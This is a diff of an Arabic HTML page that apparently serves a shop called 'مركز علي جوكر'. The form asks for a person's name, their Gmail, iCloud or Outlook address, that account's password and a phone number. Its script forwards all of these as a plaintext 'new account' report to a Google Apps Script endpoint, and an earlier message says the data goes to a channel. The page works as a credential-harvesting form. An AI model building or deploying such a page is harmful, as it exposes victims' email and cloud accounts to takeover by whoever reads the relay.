@@ -3,51 +3,169 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>إرسال بيانات</title>
+    <title>مركز علي جوكر</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f0f2f5; padding: 20px; display: flex; justify-content: center; }
-        .card { background: white; padding: 25px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 100%; max-width: 400px; }
-        h2 { text-align: center; color: #0088cc; border-bottom: 2px solid #0088cc; padding-bottom: 10px; }
-        label { display: block; margin-top: 15px; font-weight: bold; color: #333; }
-        input, select { width: 100%; padding: 12px; margin-top: 5px; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; font-size: 16px; outline: none; }
-        input:focus { border-color: #0088cc; }
-        .email-row { display: flex; gap: 5px; }
+        :root {
+            --primary-color: #0088cc;
+            --bg-color: #0f172a;
+            --glass-bg: rgba(255, 255, 255, 0.05);
+            --glass-border: rgba(255, 255, 255, 0.1);
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: radial-gradient(circle at top, #1e293b, #0f172a);
+            color: white;
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .header-title {
+            font-size: 24px;
+            font-weight: bold;
+            margin-bottom: 20px;
+            color: #00a2ff;
+            text-shadow: 0 0 15px rgba(0, 162, 255, 0.5);
+        }
+
+        .card {
+            background: var(--glass-bg);
+            backdrop-filter: blur(15px);
+            -webkit-backdrop-filter: blur(15px);
+            border: 1px solid var(--glass-border);
+            padding: 30px;
+            border-radius: 24px;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.4);
+            width: 100%;
+            max-width: 400px;
+            box-sizing: border-box;
+        }
+
+        h2 {
+            text-align: center;
+            margin-top: 0;
+            font-size: 1.2rem;
+            color: #f8fafc;
+            opacity: 0.9;
+        }
+
+        label {
+            display: block;
+            margin-top: 15px;
+            font-size: 0.9rem;
+            color: #cbd5e1;
+            margin-bottom: 5px;
+        }
+
+        input, select {
+            width: 100%;
+            padding: 14px;
+            background: rgba(255, 255, 255, 0.07);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 12px;
+            color: white;
+            font-size: 16px;
+            box-sizing: border-box;
+            outline: none;
+            transition: 0.3s;
+        }
+
+        input:focus {
+            background: rgba(255, 255, 255, 0.12);
+            border-color: var(--primary-color);
+            box-shadow: 0 0 10px rgba(0, 136, 204, 0.3);
+        }
+
+        .email-row {
+            display: flex;
+            gap: 8px;
+        }
         .email-row input { flex: 2; }
-        .email-row select { flex: 1; }
-        button { width: 100%; padding: 15px; margin-top: 25px; border: none; border-radius: 8px; background-color: #0088cc; color: white; font-size: 18px; font-weight: bold; cursor: pointer; transition: 0.3s; }
-        button:hover { background-color: #006699; }
-        button:disabled { background-color: #ccc; cursor: not-allowed; }
+        .email-row select { 
+            flex: 1; 
+            cursor: pointer;
+            background-color: #1e293b;
+        }
+
+        /* زر iOS 3D الشفاف */
+        button {
+            width: 100%;
+            padding: 16px;
+            margin-top: 30px;
+            border: none;
+            border-radius: 16px;
+            background: linear-gradient(145deg, #0099ee, #0077bb);
+            color: white;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            position: relative;
+            box-shadow: 0 6px 0 #005588, 0 12px 20px rgba(0,0,0,0.3);
+            transition: all 0.1s ease;
+            text-shadow: 0 1px 2px rgba(0,0,0,0.3);
+        }
+
+        button:active {
+            box-shadow: 0 2px 0 #005588, 0 4px 10px rgba(0,0,0,0.3);
+            transform: translateY(4px);
+        }
+
+        button:disabled {
+            background: #475569;
+            box-shadow: none;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .footer-text {
+            margin-top: 25px;
+            font-size: 13px;
+            color: #64748b;
+            letter-spacing: 1px;
+        }
+
+        ::placeholder { color: rgba(255, 255, 255, 0.3); }
     </style>
 </head>
 <body>
 
-<div class="card">
-    <h2>📩 إدخال بيانات الحساب</h2>
-    
-    <label>الاسم الثلاثي (سيكون اسم الملف):</label>
-    <input type="text" id="name" placeholder="مثال: مصطفى حسن">
+    <div class="header-title">مركز علي جوكر</div>
 
-    <label>الايميل:</label>
-    <div class="email-row">
-        <input type="text" id="emailUser" placeholder="اسم المستخدم">
-        <select id="emailDomain">
-            <option value="@gmail.com">@gmail.com</option>
-            <option value="@icloud.com">@icloud.com</option>
-            <option value="@outlook.com">@outlook.com</option>
-        </select>
+    <div class="card">
+        <h2>📩 إدخال بيانات الحساب</h2>
+        
+        <label>الاسم الثلاثي:</label>
+        <input type="text" id="name" placeholder="اسم صاحب الحساب">
+
+        <label>الايميل:</label>
+        <div class="email-row">
+            <input type="text" id="emailUser" placeholder="المستخدم">
+            <select id="emailDomain">
+                <option value="@gmail.com">@gmail.com</option>
+                <option value="@icloud.com">@icloud.com</option>
+                <option value="@outlook.com">@outlook.com</option>
+            </select>
+        </div>
+
+        <label>الرمز (Password):</label>
+        <input type="text" id="password" placeholder="كلمة المرور">
+
+        <label>رقم الهاتف:</label>
+        <input type="tel" id="phone" placeholder="078xxxxxxxx">
+
+        <button id="sendBtn" onclick="sendData()">إرسال الآن ✅</button>
     </div>
 
-    <label>الرمز (Password):</label>
-    <input type="text" id="password" placeholder="كلمة المرور">
-
-    <label>رقم الهاتف:</label>
-    <input type="tel" id="phone" placeholder="078xxxxxxxx">
-
-    <button id="sendBtn" onclick="sendData()">إرسال الآن ✅</button>
-</div>
+    <div class="footer-text">تصميم مكتبة المصطفى</div>
 
 <script>
-    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbyyp8-8IWYBdp0vAoTtUeTWlWmKN-NygnyLlZc3Pe9sXV6sGMsT8zJ1H7cm5RNfSZig0g/exec"
+    // الرابط الأخير الذي أرسلته أنت
+    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbyuoOvZ5IYpoXMwj_TOT0canI93j0wkLKwImUiWYfNlmUde41gYEbQ8DeP8Pe48YV9QEA/exec";
 
     async function sendData() {
         const btn = document.getElementById('sendBtn');
@@ -58,7 +176,7 @@
         const phone = document.getElementById('phone').value;
 
         if (!name || !emailUser || !pass) {
-            alert("⚠️ يرجى كتابة الاسم والايميل والرمز");
+            alert("⚠️ يرجى إكمال الحقول المطلوبة");
             return;
         }
 
@@ -69,7 +187,6 @@
         const report = `📩 حساب جديد 📩\n\n👤 الاسم:\n${name}\n📧 الايميل:\n${fullEmail}\n🔑 الرمز:\n${pass}\n📞 الهاتف:\n${phone}`;
 
         try {
-            // نستخدم طريقة إرسال متوافقة مع Google Script
             await fetch(SCRIPT_URL, {
                 method: 'POST',
                 mode: 'no-cors',
@@ -80,7 +197,7 @@
                 })
             });
 
-            alert("تم الإرسال بنجاح إلى القناة ✅");
+            alert("تم الإرسال بنجاح ✅");
             
             // تصفير البيانات
             document.getElementById('name').value = "";
@@ -89,8 +206,7 @@
             document.getElementById('phone').value = "";
             
         } catch (error) {
-            alert("❌ حدث خطأ، حاول مرة أخرى");
-            console.error(error);
+            alert("❌ حدث خطأ في الاتصال");
         } finally {
             btn.disabled = false;
             btn.innerText = "إرسال الآن ✅";
